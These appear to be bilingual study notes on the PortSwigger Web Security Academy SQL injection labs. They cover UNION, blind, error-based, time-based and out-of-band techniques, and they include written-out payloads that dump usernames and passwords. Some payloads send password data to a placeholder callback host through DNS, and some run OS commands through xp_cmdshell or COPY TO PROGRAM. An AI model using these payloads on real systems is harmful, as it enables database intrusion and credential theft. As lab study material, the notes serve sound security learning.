---
title: SQL injection
published: 2026-07-29
draft: false
tags: [sql]
category: PostSwigger
status: completed
platform: portswigger
---
>**Note:** Điều quan trọng nhất trong SQL injection là phải nhận diện được database mà trang web sử dụng để truy vấn là loại nào. Và cách này chỉ áp dụng với Relational Database (NoSQL có cách truy vấn khác)

>**Cheatsheet:** https://portswigger.net/web-security/sql-injection/cheat-sheet

# 1. What is SQL injection?
SQL injection (SQLi) is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. 

It can also enable them to perform denial-of-service attacks.
# 2. How to detect SQL injection vulnerabilities?
SQL injection vulnerabilities can occur at any location within the query, and within different query types. Some other common locations where SQL injection arises are:
![image](./images/sql-injection/BkqTMSLY-e.png)

# 3. Retrieving hidden data
> [!WARNING]
> Warning for tester:
![image](./images/sql-injection/SkeCNSLKZx.png)
**Don't test recklessly - it could break the real system.**

# 4. Subverting application logic
**You can bypass the password check by using the comment sequence** -- --
![image](./images/sql-injection/SkiB6B8F-l.png)
Since the URL cannot be modified, you need to inject your payload directly into the login form:
![image](./images/sql-injection/SktkarIF-e.png)

# 5. SQL inject UNION attacks
When an application is vulnerable to SQL injection, and the results of the query are returned within the application's responses, you can use the **UNION** keyword to retrieve data from other tables within the database. This is commonly known as a SQL injection **UNION** attack.

The **UNION** keyword enables you to execute one or more additional SELECT queries and append the results to the original query. 

**For example:** `SELECT a, b FROM table1 UNION SELECT c, d FROM table2`
This SQL query returns a single result set with two columns, containing values from columns a and b in table1 and columns c and d in table2.

For a UNION query to work, two key requirements must be met:
- The individual queries must return the same number of columns.
- The data types in each column must be compatible between the individual queries.

To carry out a SQL injection UNION attack, make sure that your attack meets these two requirements. This normally involves finding out:
- How many columns are being returned from the original query.
- Which columns returned from the original query are of a suitable data type to hold the results from the injected query.

# 6. Determining the number of columns required
>**Note 1:** 2 basic method to determine the number of columns

![image](./images/sql-injection/SkV3T972Wg.png)
![image](./images/sql-injection/SkPaT5X3bg.png)

>**Note 2:** Finding columns with a useful data type

![image](./images/sql-injection/rJaETqXhWl.png)


# 7. Using a SQL injection UNION attack to retrieve interesting data
![image](./images/sql-injection/SklR297h-e.png)

>**Note:** In some cases the query in the previous example may only return a single column. You can retrieve multiple values together within this single column by concatenating the values together. You can include a separator to let you distinguish the combined values. For example, on Oracle you could submit the input:

``` 
'UNION SELECT NULL, username || '-' || password FROM users--
```

# 8. Examining the database
![image](./images/sql-injection/HJSRQFQnWl.png)
>**Note 1:** Some ways to determine the databasese version

![image](./images/sql-injection/rJqROF73bl.png)

>**Note 2:** Phải dùng encode không thì nó sẽ chặn 
```
%27%20UNION%20SELECT%20NULL,@@version--%20
```

![image](./images/sql-injection/BJ604qmhWx.png)

>**Note 3:** Listing the contents of the database

![image](./images/sql-injection/Hknfh9X2Zl.png)

**Bước 1:** Dùng cách này để lấy được tên bảng
```
' UNION SELECT string_agg(table_name, ','), NULL FROM information_schema.tables WHERE table_schema = 'public'--
```
hoặc có thể dùng cách này nhưng mà nó sẽ có khá nhiều thông tin:
 ```
 ' UNION SELECT table_name, NULL FROM information_schema.tables--
 ```
![image](./images/sql-injection/B1qos972-g.png)

**Bước 2:** Dùng cách này để lấy được các cột trong tên bảng đó
```
' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'users_djjfcg'--
```
![image](./images/sql-injection/rJ9qj9m3We.png)

**Bước 3:**
```
' UNION SELECT username_ovzwpp || ':' || password_jjisyl, NULL FROM users_djjfcg--
```
![image](./images/sql-injection/Bk4Cj5XhWx.png)

# 9. Blind SQL injection
Blind SQL Injection là kỹ thuật khai thác lỗ hổng SQL Injection khi ứng dụng không trả về kết quả truy vấn hoặc thông báo lỗi, buộc attacker phải suy luận dữ liệu thông qua các phản hồi gián tiếp như **điều kiện đúng/sai (boolean)** hoặc **độ trễ thời gian (time-based).**

# 10. Exploiting blind SQL injection by triggering conditionnal responses
>**Note 1:** Bước đầu tiên dùng để quan sát phản ứng của trang web.

![image](./images/sql-injection/SJtcaiQ3-g.png)
**Example:** `SELECT * FROM users WHERE name = '<input>'`
![image](./images/sql-injection/Syy11nQnWg.png)

> [!TIP]
> TIP:
- 👉 Tìm ra TrackingId mà không cần burp suite. 
![image](./images/sql-injection/HyP9NnmhWl.png)
![image](./images/sql-injection/H1ooOnmh-l.png)


> [!TIP]
> Syntax:
- **SUBSTRING(string, start, length)**
- **SUBSTRING(string FROM start FOR length)**

>**Note 2:** Dùng để đoán phạm vi từng ký tự của mật khẩu và brute force.

![image](./images/sql-injection/Byc0b2m2Wl.png)

**Example:**
![image](./images/sql-injection/BJlH23XhWe.png)
![image](./images/sql-injection/rJtIG6mhZe.png)


# 11. Error-based SQL injection 
> a special case of Blind SQL

Error-based SQL injection refers to cases where you're able to use error messages to either extract or infer(suy luận) sensitive data from the database, even in blind contexts. The possibilities depend on the configuration of the database and the types of errors you're able to trigger
> **Key insight 1:** If normal responses don’t change, you force the database to scream when something is TRUE.
Example:
![image](./images/sql-injection/BJD649V2-x.png)


> **Key insight 2:** You’re not observing the data — you’re observing side effects

> **Key insight 3:** You are converting a hidden condition into a visible failure

**1. Exploiting blind SQL injection by triggering conditional errors:**
![image](./images/sql-injection/SyjP89V3We.png)
> [!TIP]
> Flow thực hiện:
>![image](./images/sql-injection/r1YzqoE2-l.png)

> [!NOTE]
> Question: How do I figure out password length when I can’t see the data?

>**Note 1:** Cách nhận biết database nào đang sử dụng.
![image](./images/sql-injection/HkFQFiEh-e.png)
![image](./images/sql-injection/rkajFj4nZl.png)

>**Note 2:** Tại sao phải dùng FROM dual trong Oracle?
![image](./images/sql-injection/Sk9ihi4nbg.png)

**Payload:**
```
'||(SELECT CASE 
       WHEN (SELECT LENGTH(password) FROM users WHERE username='administrator')=20 
       THEN TO_CHAR(1/0) 
       ELSE '' 
     END 
FROM dual)||'
```
**Payload in oneline:**
```
'||(SELECT CASE WHEN (SELECT LENGTH(password) FROM users WHERE username='administrator')=19 THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
```
![image](./images/sql-injection/HyZ1di4hbg.png)
![image](./images/sql-injection/rJZlui4hZg.png)

**Brute force password:**
```
'||(SELECT CASE WHEN SUBSTR((SELECT password FROM users WHERE username='administrator'),pos,1)='char' THEN TO_CHAR(1/0) ELSE '1' END FROM dual)
```
![image](./images/sql-injection/B1UmEnNhbl.png)

**2. Extracting sensitive data via verbose(chi tiết) SQL error messages:**
![image](./images/sql-injection/HkgvlaV2-x.png)
You can use the **`CAST()`** function to achieve this. It enables you to convert one data type to another. For example, imagine a query containing the following statement:
```
CAST((SELECT example_column FROM example_table) AS int)
```

Often, the data that you're trying to read is a string. Attempting to convert this to an incompatible data type, such as an int, may cause an error similar to the following:

> [!WARNING]
> ERROR: invalid input syntax for type integer: "Example data"
This type of query may also be useful if a character limit prevents you from triggering conditional responses.

> [!CAUTION]
> IMPORTANT:
>Một điều quan trọng là bạn phải nhận diện các lỗi đặc trưng của từng database

> [!TIP]
> Example:
>![image](./images/sql-injection/r1BVjpE3bg.png)
**Bước 1:** Test xem web bị lỗi gì
![image](./images/sql-injection/SkxW3aEnWl.png)
**Bước 2:** Quan sát thấy server luôn giới hạn độ dài của TrackingId cookie và việc thay đổi TrackingId thành x thì dù nó không match với record nào nhưng nó vẫn có thể thực thi
![image](./images/sql-injection/BkoBmAV2bl.png)
Tiếp theo ta rút gọn và nhận thấy là server đã trả về password:
**`CAST((SELECT password FROM users LIMIT 1) AS int)`**
![image](./images/sql-injection/r1WYmAN3-e.png)
Còn 1 cách rút gọn mà chỉ áp dụng với PostgreSQL:
**`(SELECT password FROM users LIMIT 1)::int`**
![image](./images/sql-injection/ByK6QC43Zg.png)
**Chú ý:** Trường hợp có nhiều user thì ta tìm ra vị trí của admin rồi mới tìm password.
![image](./images/sql-injection/HyIMvC42We.png)
![image](./images/sql-injection/HJUDPCN2bx.png)

# 12. Exploiting blind SQL injection by triggering time delays
![image](./images/sql-injection/S1l04ZL2Zg.png)
![image](./images/sql-injection/BJE_4bLhWl.png)
> [!NOTE]
> **Example:** Dấu `;` dùng để kết thúc truy vấn trước.
>![image](./images/sql-injection/rJUEBW8n-e.png)

> [!TIP]
> Test loại database;
>![image](./images/sql-injection/Bkx1Kb82-e.png)

**Bước 1:** Trong lúc test loại database, đôi khi chúng ta phải encode**
>**PostgreSQL:**

![image](./images/sql-injection/HySTpbL2Wx.png)
>**MySQL:**

![image](./images/sql-injection/r1-SCZUhWl.png)

**Bước 2:** Xác định độ dài của password khi đã biết loại database.
![image](./images/sql-injection/B1ZV-zI3-l.png)

**Bước 3:** Brute force password.
![image](./images/sql-injection/Sys3mM8hWg.png)

# 13. Exploiting blind SQL injection using out-of-band (OAST) techniques
>**Key insight:** OAST = kỹ thuật test bảo mật mà kết quả không trả về qua HTTP response mà trả về qua một kênh khác (DNS, HTTP callback, v.v.)
>![image](./images/sql-injection/SykcPVI2Zg.png)


> [!NOTE]
> Notion: The Core Problem First

>In normal blind SQL injection, you infer data through:
- Boolean-based: Does the page behave differently? (true/false)
- Time-based: Does the response take longer? (SLEEP(5))

>Both rely on observing the HTTP response from the server. 

![image](./images/sql-injection/r1epxm83Ze.png)
![image](./images/sql-injection/rJUWfQU2-l.png)
![image](./images/sql-injection/B1p_zQLhWx.png)

>**OAST = Out-of-Band Application Security Testing:**
![image](./images/sql-injection/rkUPmXIhWg.png)

> [!TIP]
> Tool: Dùng thay Burp Collaborator của Burp Suite
>**[Client]** Chỉ để nhận domain + lắng nghe interaction: 
![image](./images/sql-injection/rJWhw78hZg.png)
**Link repo:** https://github.com/projectdiscovery/interactsh

> [!NOTE]
> Note: Phân loại theo từng database:
>**Microsoft SQL Server:**
>```
>- Dùng xp_dirtree
>'; exec master..xp_dirtree '//abc123.oast.pro/a'--
>
>- Dùng xp_cmdshell
>'; exec master..xp_cmdshell 'nslookup abc123.oast.pro'--
>```
>![image](./images/sql-injection/rksNTXL2be.png)
>
>**Oracle:**
>```
>- Dùng UTL_HTTP
>' || (SELECT UTL_HTTP.REQUEST('http://abc123.oast.pro')) FROM dual--
>
>- Dùng UTL_INADDR (DNS lookup)
>' || (SELECT UTL_INADDR.GET_HOST_ADDRESS('abc123.oast.pro')) FROM dual--
>
>- Exfiltrate data luôn
>' || (SELECT UTL_INADDR.GET_HOST_ADDRESS(
>    (SELECT password FROM users WHERE rownum=1)
>    ||'.abc123.oast.pro'
>)) FROM dual--
>```
>![image](./images/sql-injection/ByAS67LhWe.png)
>
>**MySQL:**
>```
>- MySQL thường bị giới hạn outbound, dùng LOAD_FILE
>' AND LOAD_FILE(CONCAT('\\\\',
>    (SELECT password FROM users LIMIT 1),
>    '.abc123.oast.pro\\a'))--
>```
>
>**PostgreSQL:**
>```
>- Dùng COPY
>'; COPY (SELECT '') TO PROGRAM 'nslookup abc123.oast.pro'--
>
>- Dùng dblink
>' || (SELECT dblink_connect('host='||
>    (SELECT password FROM users LIMIT 1)
>    ||'.abc123.oast.pro')) --
>```
>![image](./images/sql-injection/rJ-tT7Unbe.png)

![image](./images/sql-injection/r1ZZ_V82We.png)
>Giới hạn của DNS mà bạn phải biết
![image](./images/sql-injection/SJ0FuEUhZe.png)

>Exiltrate data dài:
![image](./images/sql-injection/BJFw_4LnWe.png)

> [!IMPORTANT]
> Based-knownledge:
>![image](./images/sql-injection/HyEqtV8hZe.png)
>
>![image](./images/sql-injection/S1CN9NInWx.png)
>![image](./images/sql-injection/S1xjtV8nbx.png)
>![image](./images/sql-injection/r1YocEI3We.png)
>
>![image](./images/sql-injection/Sk2C9EU3Ze.png)
>![image](./images/sql-injection/SJeWsEU2-e.png)

> [!NOTE]
> NOTE:
> Payload sử dụng trong lab theo cấu trúc này được dùng theo kiểu đọc file và OOB callback (XML parser).
>![image](./images/sql-injection/S1EVnNUnZl.png)


# 14. SQL injection in different contexts
> [!NOTE]
> Base notion:
![image](./images/sql-injection/B18MCNL3Wg.png)

>**Tại sao XML lại bypass được WAF?**
![image](./images/sql-injection/ryzj0482We.png)
> 👉 Lỗ hổng nằm ở WAF kiểm tra trước khi decode, còn SQL interpreter nhận sau khi decode.

>**Key insight:** 
>![image](./images/sql-injection/SkkByrU3-x.png)

> [!TIP]
> Example:
>![image](./images/sql-injection/H1x3brIh-x.png)
> Lọc ra các cột trong bảng users tìm được:
> ![image](./images/sql-injection/HJTFGrUhZx.png)
>![image](./images/sql-injection/BkR6fH83bx.png)

# 15. Second-order SQL injection
> **Key insight:** Payload nằm im trong DB, chờ đến khi app tự lấy ra dùng thì mới kích hoạt.
> ![image](./images/sql-injection/ByhmVS82-x.png)


![image](./images/sql-injection/S1snIH82Ze.png)

![image](./images/sql-injection/S1TNVS8h-e.png)
![image](./images/sql-injection/ryC9EHIn-x.png)


# 16. How to prevent SQL injection
![image](./images/sql-injection/r1gbOS82We.png)
![image](./images/sql-injection/HyFZuSU2Ze.png)
